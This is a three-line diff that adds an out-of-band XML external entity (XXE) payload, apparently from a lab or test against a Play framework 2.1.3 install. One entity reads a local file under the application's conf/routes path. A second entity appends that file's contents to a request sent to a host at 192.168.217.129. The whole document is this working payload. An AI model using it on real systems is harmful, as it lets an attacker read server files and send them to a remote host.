@@ -1,0 +1,3 @@
+<!ENTITY % p1 SYSTEM "file:///opt/play-2.1.3/xxe/conf/routes/0ecf87346b9c0b370f8d63e6e7fed4f0">
+<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://192.168.217.129:80/BLAH?%p1;'>">
+%p2;
